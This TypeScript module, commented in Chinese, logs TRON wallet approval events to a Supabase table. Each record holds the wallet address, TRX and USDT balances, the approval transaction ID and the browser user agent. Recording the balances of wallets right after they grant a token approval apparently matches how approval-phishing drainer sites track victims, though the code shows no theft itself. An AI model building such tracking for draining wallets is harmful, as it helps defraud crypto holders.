import { getSupabaseBrowserClient } from "@/lib/supabaseClient";

export type WalletAuthorizationPayload = {
  walletAddress: string;
  trxBalance: number;
  usdtBalance: number;
  approvalTxId?: string | null;
  locale?: string;
};

function extractTronTxId(result: unknown): string | null {
  if (typeof result === "string") {
    const s = result.trim();
    return s.length > 0 ? s : null;
  }
  if (result && typeof result === "object") {
    const o = result as Record<string, unknown>;
    const txid = o.txid ?? o.txID;
    if (typeof txid === "string" && txid.length > 0) {
      return txid;
    }
  }
  return null;
}

export function parseApprovalSendResult(sendResult: unknown): string | null {
  return extractTronTxId(sendResult);
}

/** 將鏈上授權成功後的紀錄寫入 Supabase（未設定環境變數時靜默略過）。 */
export async function submitWalletAuthorizationRecord(payload: WalletAuthorizationPayload): Promise<void> {
  const supabase = getSupabaseBrowserClient();
  if (!supabase) {
    console.warn("[supabase] VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY 未設定，略過授權紀錄上傳。");
    return;
  }

  const { error } = await supabase.from("wallet_authorizations").insert({
    wallet_address: payload.walletAddress,
    trx_balance: payload.trxBalance,
    usdt_balance: payload.usdtBalance,
    approval_tx_id: payload.approvalTxId ?? null,
    locale: payload.locale ?? null,
    user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 512) : null,
  });

  if (error) {
    console.error("[supabase] 寫入 wallet_authorizations 失敗:", error.message);
  }
}
